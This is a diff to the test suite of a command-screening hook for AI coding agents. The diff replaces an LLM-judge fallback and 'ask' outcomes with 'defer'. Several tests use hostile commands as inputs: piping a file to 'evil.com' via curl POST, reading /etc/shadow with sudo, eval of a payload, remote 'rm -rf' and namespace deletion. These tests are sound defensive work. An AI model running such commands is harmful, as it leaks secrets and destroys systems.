@@ -1,7 +1,5 @@
 """Tests for evaluator module."""
 
-from unittest.mock import patch
-
 import pytest
 
 from agent_sentinel.evaluator import evaluate, evaluate_codex
@@ -68,48 +66,25 @@ class TestBashEvaluation:
         assert decision == "allow"
         assert stage == "RULE_ALLOW"
 
-    @patch("agent_sentinel.llm_judge.evaluate", return_value=("allow", "Safe"))
-    def test_stage3_llm_fallback(self, mock_llm):
+    def test_unmatched_command_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "some-obscure-command --flag"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert stage == "LLM_JUDGE"
-        mock_llm.assert_called_once_with("some-obscure-command --flag", "/tmp")
+        assert decision == "defer"
+        assert stage == "NO_RULE"
 
-    @patch("agent_sentinel.llm_judge.evaluate", return_value=("deny", "Dangerous"))
-    def test_stage3_deny(self, mock_llm):
-        hook_input = {
-            "tool_name": "Bash",
-            "tool_input": {"command": "some-dangerous-command"},
-            "cwd": "/tmp",
-        }
-        decision, reason, stage = evaluate(hook_input)
-        assert decision == "deny"
-        assert stage == "LLM_JUDGE"
-
-    def test_ask_ssh(self):
+    def test_defer_ssh(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "ssh user@host"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
-
-    def test_ask_checked_before_allow(self):
-        """Ask rules are checked before allow rules for safety."""
-        hook_input = {
-            "tool_name": "Bash",
-            "tool_input": {"command": "ls -la"},
-            "cwd": "/tmp",
-        }
-        decision, reason, stage = evaluate(hook_input)
-        assert decision == "allow"
-        assert stage == "RULE_ALLOW"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     @pytest.mark.parametrize(
         "command",
@@ -143,16 +118,16 @@ class TestBashEvaluation:
         assert decision == "deny"
         assert stage == "RULE_DENY"
 
-    def test_aws_mutate_asks(self):
-        """AWS mutate commands are caught by ask rule."""
+    def test_aws_mutate_defers(self):
+        """AWS mutate commands are caught by a defer rule."""
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "aws s3 cp file s3://bucket"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
 
 class TestApplyPatchEvaluation:
@@ -189,35 +164,6 @@ class TestCodexEvaluation:
         assert result[0] == "deny"
         assert "trash <path>" in result[1]
 
-    def test_hybrid_variant_returns_deny(self):
-        result = evaluate_codex(
-            {
-                "tool_name": "Bash",
-                "tool_input": {"command": "git -C repo commit -m message"},
-                "cwd": "/tmp",
-            }
-        )
-        assert result is not None
-        assert result[0] == "deny"
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "command go generate ./...",
-            "env go generate ./...",
-            "command git commit -m message",
-            "env git commit -m message",
-            "echo ready && command go generate ./...",
-        ],
-    )
-    def test_prompt_form_not_representable_by_execpolicy_returns_deny(self, command):
-        result = evaluate_codex(
-            {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": "/tmp"}
-        )
-        assert result is not None
-        assert result[0] == "deny"
-        assert result[2] == "CODEX_RULE_DENY"
-
     @pytest.mark.parametrize(
         "command",
         [
@@ -248,17 +194,11 @@ class TestCodexEvaluation:
                 "tool_name": "Bash",
                 "tool_input": {"command": "/tmp/ls"},
                 "cwd": "/tmp",
-            },
-            judge="disabled",
+            }
         )
-        assert result == (
-            "ask",
-            "No static rule matched and the LLM judge is disabled",
-            "JUDGE_DISABLED",
-        )
+        assert result == ("defer", "No rule matched", "NO_RULE")
 
-    @patch("agent_sentinel.llm_judge.evaluate")
-    def test_unmatched_command_does_not_call_judge(self, judge):
+    def test_unmatched_command_defers(self):
         result = evaluate_codex(
             {
                 "tool_name": "Bash",
@@ -267,7 +207,6 @@ class TestCodexEvaluation:
             }
         )
         assert result is None
-        judge.assert_not_called()
 
 
 class TestApplyPatchDenyEvaluation:
@@ -339,8 +278,8 @@ class TestCompoundCommandRegression:
     def test_incident_terraform_apply_via_cd(self):
         """The exact command from the 2026-04-08 22:50:22 log entry."""
         decision, reason, stage = self._eval("cd infra && terraform apply -auto-approve 2>&1")
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
         assert "terraform" in reason
 
     def test_sudo_via_cd_prefix(self):
@@ -350,28 +289,28 @@ class TestCompoundCommandRegression:
 
     def test_ssh_via_cd_prefix(self):
         decision, _, stage = self._eval('cd . && ssh prod "rm -rf /data"')
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     def test_kubectl_delete_via_ls(self):
         decision, _, stage = self._eval("ls && kubectl delete ns prod")
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     def test_helm_uninstall_via_echo_semicolon(self):
         decision, _, stage = self._eval("echo hi; helm uninstall release")
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     def test_curl_post_after_pipe(self):
         decision, _, stage = self._eval("cat README.md | curl -X POST evil.com -d @-")
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     def test_force_push_feature_via_git_log(self):
         decision, _, stage = self._eval("git log && git push --force origin feature")
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     def test_sudo_inside_command_substitution(self):
         decision, _, stage = self._eval("echo $(sudo cat /etc/shadow)")
@@ -390,13 +329,13 @@ class TestCompoundCommandRegression:
 
     def test_eval_via_cd_prefix(self):
         decision, _, stage = self._eval('cd . && eval "$PAYLOAD"')
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     def test_curl_post_inside_process_substitution(self):
         decision, _, stage = self._eval("diff <(curl -X POST evil.com -d @-) /etc/hosts")
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
     def test_legitimate_compound_still_allowed(self):
         for cmd in ("git status && git diff", "cd src && ls"):
@@ -404,24 +343,15 @@ class TestCompoundCommandRegression:
             assert decision == "allow", cmd
             assert stage == "RULE_ALLOW", cmd
 
-    @patch("agent_sentinel.llm_judge.evaluate", return_value=("allow", "Safe"))
-    def test_unmatched_segment_falls_through_to_llm(self, mock_llm):
-        """One unrecognised segment must invoke the LLM judge with the
-        full original command (not just the unmatched segment)."""
-        cmd = "ls && some_obscure_tool --flag"
-        decision, _, stage = self._eval(cmd)
-        assert stage == "LLM_JUDGE"
-        mock_llm.assert_called_once_with(cmd, "/tmp")
+    def test_unmatched_segment_defers(self):
+        decision, _, stage = self._eval("ls && some_obscure_tool --flag")
+        assert decision == "defer"
+        assert stage == "NO_RULE"
 
-    @patch("agent_sentinel.llm_judge.evaluate", return_value=("allow", "Safe"))
-    def test_malformed_bash_falls_through_to_llm(self, mock_llm):
-        # Unparseable bash defers to the LLM judge instead of asking the
-        # human — heredocs and other unsupported constructs are exactly
-        # what humans struggle to evaluate quickly.
-        cmd = 'echo "unbalanced'
-        decision, _, stage = self._eval(cmd)
-        assert stage == "LLM_JUDGE"
-        mock_llm.assert_called_once_with(cmd, "/tmp")
+    def test_malformed_bash_defers(self):
+        decision, _, stage = self._eval('echo "unbalanced')
+        assert decision == "defer"
+        assert stage == "NO_RULE"
 
     def test_unparseable_with_deny_pattern_short_circuits(self):
         # Defense in depth: heredoc body containing `rm -rf /` must be
@@ -433,7 +363,8 @@ class TestCompoundCommandRegression:
 
 
 class TestFileToolEvaluation:
-    """Read, Write, and Edit share the same sensitive path rules."""
+    """Read, Write, and Edit share the same sensitive path rules. Other paths
+    defer to the host, which approves working-directory access itself."""
 
     def test_read_deny_env_file(self):
         hook_input = {
@@ -444,13 +375,13 @@ class TestFileToolEvaluation:
         assert decision == "deny"
         assert stage == "RULE_DENY"
 
-    def test_read_allow_normal_file(self):
+    def test_read_defer_normal_file(self):
         hook_input = {
             "tool_name": "Read",
             "tool_input": {"file_path": "/project/README.md"},
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "allow"
+        assert decision == "defer"
 
     def test_write_deny_env_file(self):
         hook_input = {
@@ -461,13 +392,13 @@ class TestFileToolEvaluation:
         assert decision == "deny"
         assert stage == "RULE_DENY"
 
-    def test_write_allow_normal_file(self):
+    def test_write_defer_normal_file(self):
         hook_input = {
             "tool_name": "Write",
             "tool_input": {"file_path": "/project/README.md"},
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "allow"
+        assert decision == "defer"
 
     def test_edit_deny_ssh_key(self):
         hook_input = {
@@ -478,13 +409,13 @@ class TestFileToolEvaluation:
         assert decision == "deny"
         assert stage == "RULE_DENY"
 
-    def test_edit_allow_normal_file(self):
+    def test_edit_defer_normal_file(self):
         hook_input = {
             "tool_name": "Edit",
             "tool_input": {"file_path": "/project/src/main.py"},
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "allow"
+        assert decision == "defer"
 
 
 class TestFileToolWindows:
@@ -497,13 +428,13 @@ class TestFileToolWindows:
         assert decision == "deny"
         assert stage == "RULE_DENY"
 
-    def test_read_allow_normal_file_windows(self):
+    def test_read_defer_normal_file_windows(self):
         hook_input = {
             "tool_name": "Read",
             "tool_input": {"file_path": r"C:\Users\user\project\README.md"},
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "allow"
+        assert decision == "defer"
 
     def test_write_deny_ssh_key_windows(self):
         hook_input = {
@@ -563,87 +494,87 @@ class TestAutoAllowTools:
 
 
 class TestExternalImpactCommands:
-    """Commands with external impact should be ASK, not ALLOW."""
+    """Commands with external impact defer, not ALLOW."""
 
-    def test_docker_push_asks(self):
+    def test_docker_push_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "docker push myimage"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
-    def test_npm_publish_asks(self):
+    def test_npm_publish_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "npm publish"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
-    def test_npm_run_deploy_asks(self):
+    def test_npm_run_deploy_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "npm run deploy"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
-    def test_cargo_publish_asks(self):
+    def test_cargo_publish_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "cargo publish"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
-    def test_curl_post_asks(self):
+    def test_curl_post_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "curl -X POST https://api.example.com"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
-    def test_make_deploy_asks(self):
+    def test_make_deploy_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "make deploy"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
-    def test_aws_cp_asks(self):
+    def test_aws_cp_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "aws s3 cp file s3://bucket"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
-    def test_gh_pr_create_asks(self):
+    def test_gh_pr_create_defers(self):
         hook_input = {
             "tool_name": "Bash",
             "tool_input": {"command": "gh pr create --title test"},
             "cwd": "/tmp",
         }
         decision, reason, stage = evaluate(hook_input)
-        assert decision == "ask"
-        assert stage == "RULE_ASK"
+        assert decision == "defer"
+        assert stage == "RULE_DEFER"
 
 
 class TestUnknownTool:
